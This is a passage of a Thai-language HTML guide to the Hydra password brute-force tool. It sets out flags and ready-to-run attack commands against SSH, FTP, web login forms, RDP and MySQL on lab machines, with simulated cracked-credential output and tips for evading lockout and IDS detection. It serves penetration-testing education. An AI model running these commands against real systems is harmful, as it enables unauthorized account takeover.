@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8">
+<title>คู่มือ Hydra (THC-Hydra)</title>
+<style>
+  :root{
+    --bg:#0f1115; --panel:#161922; --panel2:#1d212c;
+    --text:#e6e8ee; --muted:#9aa3b2; --accent:#5ee3c1;
+    --warn-bg:#2a1717; --warn-border:#7a2e2e; --warn-text:#f3c9c9;
+    --code-bg:#0b0e14; --border:#2a2f3a;
+  }
+  *{box-sizing:border-box;}
+  body{
+    background:var(--bg); color:var(--text);
+    font-family:"Sarabun","Segoe UI",sans-serif;
+    line-height:1.7; margin:0; padding:0 0 60px 0;
+  }
+  .wrap{max-width:880px; margin:0 auto; padding:32px 20px;}
+  header.title{
+    border-bottom:1px solid var(--border); padding-bottom:24px; margin-bottom:28px;
+  }
+  header.title h1{
+    font-size:1.9rem; margin:0 0 6px 0; color:#fff;
+    letter-spacing:0.3px;
+  }
+  header.title p.subtitle{color:var(--muted); margin:0; font-size:1.02rem;}
+  .badge{
+    display:inline-block; background:var(--panel2); color:var(--accent);
+    border:1px solid var(--accent); border-radius:20px;
+    padding:3px 12px; font-size:0.78rem; margin-top:10px;
+  }
+
+  .warning{
+    background:var(--warn-bg); border:1px solid var(--warn-border);
+    border-radius:10px; padding:18px 20px; margin-bottom:32px;
+  }
+  .warning .label{
+    color:var(--warn-text); font-weight:700; margin-bottom:8px;
+    display:flex; align-items:center; gap:8px; font-size:1rem;
+  }
+  .warning p{color:#e8d4d4; margin:8px 0; font-size:0.95rem;}
+
+  nav.toc{
+    background:var(--panel); border:1px solid var(--border);
+    border-radius:10px; padding:18px 22px; margin-bottom:36px;
+  }
+  nav.toc h2{font-size:0.95rem; color:var(--muted); margin:0 0 10px 0; text-transform:uppercase; letter-spacing:1px;}
+  nav.toc ol{margin:0; padding-left:20px; columns:1;}
+  nav.toc li{margin-bottom:6px;}
+  nav.toc a{color:var(--text); text-decoration:none; border-bottom:1px dashed transparent;}
+  nav.toc a:hover{color:var(--accent); border-bottom-color:var(--accent);}
+
+  section{margin-bottom:44px;}
+  h2{
+    font-size:1.4rem; color:#fff; border-left:4px solid var(--accent);
+    padding-left:12px; margin:0 0 18px 0;
+  }
+  h3{
+    font-size:1.12rem; color:var(--accent); margin:30px 0 10px 0;
+    padding-bottom:6px; border-bottom:1px solid var(--border);
+  }
+  h4{font-size:1rem; color:#fff; margin:18px 0 8px 0;}
+
+  p{margin:10px 0; color:#d4d8e0;}
+
+  ul, ol.steps{padding-left:22px;}
+  li{margin-bottom:6px;}
+
+  code.inline{
+    background:var(--code-bg); color:#9fe6c6; padding:2px 6px;
+    border-radius:4px; font-family:"JetBrains Mono",Consolas,monospace;
+    font-size:0.88em;
+  }
+
+  pre{
+    background:var(--code-bg); border:1px solid var(--border);
+    border-radius:8px; padding:16px 18px; overflow-x:auto;
+    font-family:"JetBrains Mono",Consolas,monospace; font-size:0.86rem;
+    line-height:1.6; margin:12px 0;
+  }
+  pre.cmd{border-left:3px solid var(--accent);}
+  pre.output{border-left:3px solid #5b8cff; color:#b9c4e0;}
+  pre .comment{color:var(--muted);}
+  pre .hit{color:#7CFFB2; font-weight:700;}
+  pre .flag{color:#ffd479;}
+
+  .cmd-label, .out-label{
+    font-size:0.75rem; text-transform:uppercase; letter-spacing:1px;
+    color:var(--muted); margin:18px 0 4px 0; display:block;
+  }
+
+  table{
+    width:100%; border-collapse:collapse; margin:14px 0;
+    font-size:0.92rem;
+  }
+  th, td{
+    border:1px solid var(--border); padding:10px 12px; text-align:left;
+    vertical-align:top;
+  }
+  th{background:var(--panel2); color:var(--accent);}
+  tr:nth-child(even){background:rgba(255,255,255,0.02);}
+
+  .scenario{
+    background:var(--panel); border:1px solid var(--border);
+    border-left:3px solid #5b8cff; border-radius:6px;
+    padding:12px 16px; margin:14px 0; font-size:0.95rem;
+  }
+  .scenario b{color:#9bb6ff;}
+
+  .explain-box{
+    background:var(--panel); border:1px solid var(--border);
+    border-radius:8px; padding:14px 18px; margin:12px 0;
+  }
+  .explain-box ul{margin:6px 0;}
+
+  .protocol-card{
+    background:var(--panel); border:1px solid var(--border);
+    border-radius:10px; padding:20px 22px; margin-bottom:28px;
+  }
+  .protocol-card h3{margin-top:0; border-bottom:none;}
+
+  footer{
+    margin-top:50px; padding-top:20px; border-top:1px solid var(--border);
+    color:var(--muted); font-size:0.85rem; text-align:center;
+  }
+
+  .back-to-top{
+    display:inline-block; margin-top:8px; font-size:0.8rem;
+    color:var(--muted); text-decoration:none;
+  }
+  .back-to-top:hover{color:var(--accent);}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header class="title" id="top">
+    <h1>คู่มือ Hydra (THC-Hydra)</h1>
+    <p class="subtitle">เครื่องมือ Brute-force / Credential Testing บน Kali Linux</p>
+    <span class="badge">Online Password Attack</span>
+  </header>
+
+  <div class="warning">
+    <div class="label">⚠️ คำเตือนสำคัญก่อนใช้งาน</div>
+    <p>Hydra ใช้สำหรับทดสอบความปลอดภัยของระบบที่คุณเป็นเจ้าของ หรือได้รับอนุญาตเป็นลายลักษณ์อักษร (authorized penetration test / CTF lab / TryHackMe / HackTheBox / Metasploitable / DVWA ที่ติดตั้งเอง) เท่านั้น</p>
+    <p>การ brute-force เข้าระบบของผู้อื่นโดยไม่ได้รับอนุญาตเป็นความผิดตาม พ.ร.บ.คอมพิวเตอร์ (และกฎหมายลักษณะเดียวกันในประเทศอื่น) ไม่ว่าจะสำเร็จหรือไม่ก็ตาม ตัวอย่าง IP ในคู่มือนี้ทั้งหมดเป็น IP สมมติของเครื่องแล็บส่วนตัว (เช่น <code class="inline">10.10.10.5</code> / <code class="inline">192.168.56.x</code>)</p>
+  </div>
+
+  <nav class="toc">
+    <h2>สารบัญ</h2>
+    <ol>
+      <li><a href="#sec1">Hydra คืออะไร</a></li>
+      <li><a href="#sec2">Syntax พื้นฐาน</a></li>
+      <li><a href="#sec3">คำอธิบาย Flag ทั้งหมด</a></li>
+      <li><a href="#sec4">ตัวอย่างการใช้งานแยกตามโปรโตคอล</a></li>
+      <li><a href="#sec5">การอ่านผลลัพธ์โดยรวม</a></li>
+      <li><a href="#sec6">เทคนิคและข้อควรระวังเพิ่มเติม</a></li>
+    </ol>
+  </nav>
+
+  <section id="sec1">
+    <h2>1. Hydra คืออะไร</h2>
+    <p>Hydra (THC-Hydra) เป็นเครื่องมือ <b>"online password cracking"</b> ทำงานโดยยิง username/password หลายๆ ชุดเข้าระบบที่เปิดให้ login ผ่านโปรโตคอลต่างๆ (network service) แบบเรียลไทม์ ต่างจาก John the Ripper หรือ Hashcat ที่ crack hash แบบ offline</p>
+
+    <h4>จุดเด่น</h4>
+    <ul>
+      <li>รองรับโปรโตคอลกว่า 50 ชนิด (ssh, ftp, http-get/post, rdp, mysql, smb, telnet, pop3, vnc ฯลฯ)</li>
+      <li>รันแบบ multi-thread พร้อมกันได้ (เร็ว)</li>
+      <li>ใช้ wordlist (เช่น rockyou.txt) หรือกำหนด pattern เองได้</li>
+    </ul>
+
+    <span class="cmd-label">ติดตั้งใน Kali (ปกติมีอยู่แล้ว)</span>
+    <pre class="cmd">sudo apt update <span class="flag">&amp;&amp;</span> sudo apt install hydra -y</pre>
+
+    <span class="cmd-label">ตรวจสอบเวอร์ชัน</span>
+    <pre class="cmd">hydra -h</pre>
+  </section>
+
+  <section id="sec2">
+    <h2>2. Syntax พื้นฐาน</h2>
+    <pre class="cmd">hydra [OPTIONS] [LOGIN/PASS OPTIONS] [TARGET] [SERVICE] [PARAM]</pre>
+
+    <span class="cmd-label">รูปแบบทั่วไป</span>
+    <pre class="cmd">hydra -l &lt;user&gt; -P &lt;wordlist&gt; &lt;target_ip&gt; &lt;service&gt;
+hydra -L &lt;userlist&gt; -p &lt;password&gt; &lt;target_ip&gt; &lt;service&gt;
+hydra -L &lt;userlist&gt; -P &lt;wordlist&gt; &lt;target_ip&gt; &lt;service&gt;</pre>
+  </section>
+
+  <section id="sec3">
+    <h2>3. คำอธิบาย Flag ทั้งหมด (ละเอียด)</h2>
+
+    <h3>กลุ่ม Username</h3>
+    <table>
+      <tr><th>Flag</th><th>ความหมาย</th><th>ตัวอย่าง</th></tr>
+      <tr><td><code class="inline">-l LOGIN</code></td><td>ระบุ username ตัวเดียว (lowercase L)</td><td><code class="inline">-l admin</code></td></tr>
+      <tr><td><code class="inline">-L FILE</code></td><td>ระบุไฟล์ wordlist ของ username (uppercase L)</td><td><code class="inline">-L users.txt</code></td></tr>
+    </table>
+
+    <h3>กลุ่ม Password</h3>
+    <table>
+      <tr><th>Flag</th><th>ความหมาย</th><th>ตัวอย่าง</th></tr>
+      <tr><td><code class="inline">-p PASS</code></td><td>ระบุ password ตัวเดียว (lowercase p)</td><td><code class="inline">-p 123456</code></td></tr>
+      <tr><td><code class="inline">-P FILE</code></td><td>ระบุไฟล์ wordlist ของ password (uppercase P)</td><td><code class="inline">-P rockyou.txt</code></td></tr>
+      <tr>
+        <td><code class="inline">-e nsr</code></td>
+        <td>
+          ลองรูปแบบเสริมอัตโนมัติ:
+          <ul>
+            <li><b>n</b> = null password (รหัสว่าง)</li>
+            <li><b>s</b> = same as login (รหัส = username)</li>
+            <li><b>r</b> = reverse login (รหัส = username สลับตัวอักษร)</li>
+          </ul>
+        </td>
+        <td><code class="inline">-e nsr</code></td>
+      </tr>
+    </table>
+
+    <h3>กลุ่มควบคุมความเร็ว / Threads</h3>
+    <table>
+      <tr><th>Flag</th><th>ความหมาย</th><th>ตัวอย่าง</th></tr>
+      <tr><td><code class="inline">-t TASKS</code></td><td>จำนวน thread พร้อมกัน (default 16) ยิ่งสูงยิ่งเร็วแต่เสี่ยง false negative/บริการล่ม</td><td><code class="inline">-t 4</code></td></tr>
+      <tr><td><code class="inline">-w TIME</code></td><td>เวลารอ response สูงสุดต่อการเชื่อมต่อ (วินาที)</td><td><code class="inline">-w 30</code></td></tr>
+      <tr><td><code class="inline">-W TIME</code></td><td>เวลาหน่วงระหว่างการเชื่อมต่อแต่ละ thread</td><td>—</td></tr>
+      <tr><td><code class="inline">-c TIME</code></td><td>หน่วงเวลาระหว่างการลองแต่ละครั้ง ใช้เลี่ยง lockout policy</td><td><code class="inline">-c 3</code></td></tr>
+    </table>
+
+    <h3>กลุ่มเป้าหมาย / พอร์ต</h3>
+    <table>
+      <tr><th>Flag</th><th>ความหมาย</th><th>ตัวอย่าง</th></tr>
+      <tr><td><code class="inline">-s PORT</code></td><td>กำหนดพอร์ตที่ไม่ใช่ default ของ service นั้น</td><td><code class="inline">-s 2222</code></td></tr>
+      <tr><td><code class="inline">-S</code></td><td>ใช้ SSL/TLS เชื่อมต่อ (https, ftps)</td><td>—</td></tr>
+    </table>
+
+    <h3>กลุ่มผลลัพธ์ / Output</h3>
+    <table>
+      <tr><th>Flag</th><th>ความหมาย</th><th>ตัวอย่าง</th></tr>
+      <tr><td><code class="inline">-o FILE</code></td><td>บันทึกผลลัพธ์ที่เจอลงไฟล์</td><td><code class="inline">-o result.txt</code></td></tr>
+      <tr><td><code class="inline">-f</code></td><td>หยุดทันทีเมื่อเจอ 1 คู่ user/pass ที่ใช้ได้</td><td>—</td></tr>
+      <tr><td><code class="inline">-F</code></td><td>หยุดทันทีเมื่อเจอคู่ที่ใช้ได้ในทุก host (กรณีมีหลาย target)</td><td>—</td></tr>
+      <tr><td><code class="inline">-v / -V</code></td><td>แสดงผล verbose (V ใหญ่ = แสดงทุกครั้งที่ลอง)</td><td>—</td></tr>
+      <tr><td><code class="inline">-q</code></td><td>quiet mode ลด error message ที่ไม่จำเป็น</td><td>—</td></tr>
+    </table>
+
+    <h3>อื่นๆ</h3>
+    <table>
+      <tr><th>Flag</th><th>ความหมาย</th><th>ตัวอย่าง</th></tr>
+      <tr><td><code class="inline">-x MIN:MAX:CHARSET</code></td><td>สร้าง password แบบ brute-force ตาม pattern</td><td><code class="inline">-x 4:6:a1</code></td></tr>
+      <tr><td><code class="inline">-M FILE</code></td><td>ระบุไฟล์รายชื่อ target หลายเครื่อง (mass attack)</td><td>—</td></tr>
+      <tr><td><code class="inline">-R</code></td><td>resume การโจมตีที่หยุดไปก่อนหน้า (อ่านจาก hydra.restore)</td><td>—</td></tr>
+    </table>
+  </section>
+
+  <section id="sec4">
+    <h2>4. ตัวอย่างการใช้งานแยกตามโปรโตคอล</h2>
+
+    <div class="protocol-card">
+      <h3>4.1 SSH (พอร์ต default 22)</h3>
+      <div class="scenario"><b>สถานการณ์:</b> แล็บทดสอบ Metasploitable2 ที่ IP 10.10.10.5 ทราบ username "msfadmin" ต้องการหา password จาก wordlist</div>
+
+      <span class="cmd-label">คำสั่ง</span>
+      <pre class="cmd">hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
+      -t 4 -V ssh://10.10.10.5</pre>
+
+      <div class="explain-box">
+        <b>อธิบายคำสั่ง</b>
+        <ul>
+          <li><code class="inline">-l msfadmin</code> → username ที่รู้แล้ว</li>
+          <li><code class="inline">-P rockyou.txt</code> → wordlist password</li>
+          <li><code class="inline">-t 4</code> → จำกัด 4 threads (SSH มัก rate-limit ถ้าแรงไป)</li>
+          <li><code class="inline">-V</code> → verbose แสดงทุกครั้งที่ลอง</li>
+          <li><code class="inline">ssh://10.10.10.5</code> → target และ protocol</li>
+        </ul>
+      </div>
+
+      <span class="out-label">ตัวอย่างผลลัพธ์ (จำลอง)</span>
+      <pre class="output">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login
+tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://10.10.10.5:22/
+<span class="comment">[ATTEMPT] target 10.10.10.5 - login "msfadmin" - pass "123456" - 1 of 14344399
+[ATTEMPT] target 10.10.10.5 - login "msfadmin" - pass "12345"  - 2 of 14344399
+[ATTEMPT] target 10.10.10.5 - login "msfadmin" - pass "password" - 3 of 14344399
+...</span>
+<span class="hit">[22][ssh] host: 10.10.10.5   login: msfadmin   password: msfadmin</span>
+1 of 1 target successfully completed, 1 valid password found
+Hydra finished at 2026-06-25 10:42:11</pre>
+
+      <div class="explain-box">
+        <b>การอ่านผลลัพธ์</b>
+        <ul>
+          <li>บรรทัด <code class="inline">[DATA]</code> บอกจำนวน combination ทั้งหมดที่ต้องลอง</li>
+          <li>บรรทัด <code class="inline">[ATTEMPT]</code> (เห็นเพราะ -V) คือทุกครั้งที่ทดลอง</li>
+          <li>บรรทัด <code class="inline">[22][ssh] host: ...</code> คือ "เจอแล้ว" รูปแบบคือ <code class="inline">[พอร์ต][โปรโตคอล] host: IP login: USER password: PASS</code></li>
+          <li>สรุปท้ายบอกจำนวน target ที่สำเร็จ</li>
+        </ul>
+      </div>
+
+      <span class="cmd-label">ตัวอย่างกรณีระบุ username list ด้วย</span>
+      <pre class="cmd">hydra -L users.txt -P rockyou.txt -t 4 -o ssh_result.txt ssh://10.10.10.5</pre>
+    </div>
+
+    <div class="protocol-card">
+      <h3>4.2 FTP (พอร์ต default 21)</h3>
+      <div class="scenario"><b>สถานการณ์:</b> เครื่องแล็บ 10.10.10.5 เปิด FTP ไม่ทราบรหัสของ user "ftpuser"</div>
+
+      <span class="cmd-label">คำสั่ง</span>
+      <pre class="cmd">hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt \
+      -t 16 ftp://10.10.10.5</pre>
+
+      <span class="out-label">ตัวอย่างผลลัพธ์ (จำลอง)</span>
+      <pre class="output">[DATA] max 16 tasks per 1 server, overall 16 tasks
+[DATA] attacking ftp://10.10.10.5:21/
+<span class="hit">[21][ftp] host: 10.10.10.5   login: ftpuser   password: letmein</span>
+1 of 1 target successfully completed, 1 valid password found</pre>
+
+      <span class="cmd-label">ทดสอบ anonymous login (เร็วและไม่ต้องเดารหัส)</span>
+      <pre class="cmd">hydra -l anonymous -p anonymous ftp://10.10.10.5</pre>
+
+      <span class="cmd-label">ระบุพอร์ต FTP ที่ไม่ใช่ default (เช่น 2121)</span>
+      <pre class="cmd">hydra -l ftpuser -P rockyou.txt -s 2121 ftp://10.10.10.5</pre>
+    </div>
+
+    <div class="protocol-card">
+      <h3>4.3 HTTP (Web Login Form) — POST method</h3>
+      <div class="scenario">
+        <b>สถานการณ์:</b> เว็บแอป DVWA บน 10.10.10.5 มีหน้า login ที่
+        <ul>
+          <li>Path: <code class="inline">/dvwa/login.php</code></li>
+          <li>Field username: <code class="inline">username</code></li>
+          <li>Field password: <code class="inline">password</code></li>
+          <li>ข้อความเมื่อ login ผิด: "Login failed"</li>
+        </ul>
+      </div>
+
+      <span class="cmd-label">คำสั่ง</span>
+      <pre class="cmd">hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+      10.10.10.5 http-post-form \
+      "/dvwa/login.php:username=^USER^&amp;password=^PASS^:Login failed"</pre>
+
+      <div class="explain-box">
+        <b>อธิบายโครงสร้าง http-post-form (3 ส่วน คั่นด้วย ':')</b>
+        <ul>
+          <li><b>ส่วนที่ 1:</b> path ของหน้า login → <code class="inline">/dvwa/login.php</code></li>
+          <li><b>ส่วนที่ 2:</b> body ที่ส่งไปแบบ POST โดยแทนตำแหน่ง username/password ด้วย <code class="inline">^USER^</code> และ <code class="inline">^PASS^</code> ตามชื่อ field จริงของฟอร์ม</li>
+          <li><b>ส่วนที่ 3:</b> "Login failed" = string ที่บอกว่า "ล็อกอินไม่สำเร็จ" (Hydra ถือว่าสำเร็จเมื่อ response "ไม่" มี string นี้)</li>
+        </ul>
+      </div>
+
+      <p>ถ้าเว็บใช้ GET form แทน POST ให้เปลี่ยนเป็น <code class="inline">http-get-form</code> ด้วย syntax เดียวกัน</p>
+
+      <span class="out-label">ตัวอย่างผลลัพธ์ (จำลอง)</span>
+      <pre class="output">[DATA] attacking http-post-form://10.10.10.5:80/dvwa/login.php
+<span class="hit">[80][http-post-form] host: 10.10.10.5   login: admin   password: password</span>
+1 of 1 target successfully completed, 1 valid password found</pre>
+
+      <span class="cmd-label">กรณีต้องแนบ cookie (เช่น session ที่ได้จาก curl/burp)</span>
+      <pre class="cmd">hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form \
+      "/dvwa/login.php:username=^USER^&amp;password=^PASS^:Login failed:H=Cookie: PHPSESSID=abc123"</pre>
+    </div>
+
+    <div class="protocol-card">
+      <h3>4.4 RDP (Remote Desktop, พอร์ต default 3389)</h3>
+      <div class="scenario"><b>สถานการณ์:</b> เครื่อง Windows แล็บ 10.10.10.20 เปิด RDP ทราบ username "administrator"</div>
+
+      <span class="cmd-label">คำสั่ง</span>
+      <pre class="cmd">hydra -l administrator -P /usr/share/wordlists/rockyou.txt \
+      -t 4 rdp://10.10.10.20</pre>
+
+      <div class="explain-box">
+        <b>หมายเหตุสำคัญ</b>
+        <ul>
+          <li>RDP มักมี account lockout policy ควรใช้ <code class="inline">-t</code> ต่ำๆ (2-4) และเพิ่ม <code class="inline">-c</code> (delay) เพื่อเลี่ยง lockout</li>
+          <li>บาง build ต้องใช้ module rdp ผ่าน freerdp library ถ้า error "rdp module not compiled":
+            <pre class="cmd">sudo apt install libfreerdp-dev</pre>
+          </li>
+        </ul>
+      </div>
+
+      <span class="out-label">ตัวอย่างผลลัพธ์ (จำลอง)</span>
+      <pre class="output">[DATA] max 4 tasks per 1 server, overall 4 tasks
+[DATA] attacking rdp://10.10.10.20:3389/
+<span class="hit">[3389][rdp] host: 10.10.10.20   login: administrator   password: P@ssw0rd!</span>
+1 of 1 target successfully completed, 1 valid password found</pre>
+    </div>
+
+    <div class="protocol-card">
+      <h3>4.5 MySQL (พอร์ต default 3306)</h3>
+      <div class="scenario"><b>สถานการณ์:</b> เครื่อง 10.10.10.5 รัน MySQL ทราบ user "root" ต้องการหา password</div>
+
+      <span class="cmd-label">คำสั่ง</span>
+      <pre class="cmd">hydra -l root -P /usr/share/wordlists/rockyou.txt \
+      -t 4 mysql://10.10.10.5</pre>
+
+      <span class="out-label">ตัวอย่างผลลัพธ์ (จำลอง)</span>
+      <pre class="output">[DATA] max 4 tasks per 1 server, overall 4 tasks
+[DATA] attacking mysql://10.10.10.5:3306/
+<span class="hit">[3306][mysql] host: 10.10.10.5   login: root   password: (empty password)</span>
+1 of 1 target successfully completed, 1 valid password found</pre>
+
+      <span class="cmd-label">ทดสอบ empty password อย่างเดียวก่อน (เร็วมาก)</span>
+      <pre class="cmd">hydra -l root -p "" mysql://10.10.10.5</pre>
+    </div>
+  </section>
+
+  <section id="sec5">
+    <h2>5. การอ่านผลลัพธ์ Hydra โดยรวม (สรุป)</h2>
+    <p>รูปแบบบรรทัดที่ "เจอ" credential จะเป็นแบบนี้เสมอ:</p>
+    <pre class="output hit">[PORT][service] host: TARGET_IP   login: USERNAME   password: PASSWORD</pre>
+
+    <span class="out-label">ตัวอย่าง</span>
+    <pre class="output hit">[22][ssh] host: 10.10.10.5   login: msfadmin   password: msfadmin</pre>
+
+    <table>
+      <tr><th>ส่วน</th><th>ความหมาย</th></tr>
+      <tr><td><code class="inline">[22][ssh]</code></td><td>พอร์ต 22 โปรโตคอล ssh</td></tr>
+      <tr><td><code class="inline">host: ...</code></td><td>IP เป้าหมาย</td></tr>
+      <tr><td><code class="inline">login: ...</code></td><td>username ที่ใช้ได้</td></tr>
+      <tr><td><code class="inline">password: ...</code></td><td>password ที่ใช้ได้</td></tr>
+    </table>
+
+    <p>ท้ายผลลัพธ์จะมีสรุปเสมอ เช่น:</p>
+    <pre class="output">1 of 1 target successfully completed, 1 valid password found</pre>
+
+    <p>ถ้าไม่เจอเลยจะแสดง:</p>
+    <pre class="output">0 of 1 target successfully completed, 0 valid passwords found</pre>
+  </section>
+
+  <section id="sec6">
+    <h2>6. เทคนิคและข้อควรระวังเพิ่มเติม</h2>
+    <ul>
+      <li>ใช้ <code class="inline">-t</code> ต่ำๆ (4-8) กับ SSH/RDP เพื่อลดโอกาสถูก IDS/IPS บล็อก หรือถูก lockout policy ล็อกบัญชี</li>
+      <li>ใช้ <code class="inline">-o</code> บันทึกผลเก็บไว้ทุกครั้ง เผื่อ session หลุดจะไม่ต้องรันใหม่</li>
+      <li>รวมกับ nmap ก่อนเสมอ เพื่อยืนยันว่าพอร์ต/service เปิดจริงและตรงเวอร์ชัน
+        <pre class="cmd">nmap -sV -p- 10.10.10.5</pr
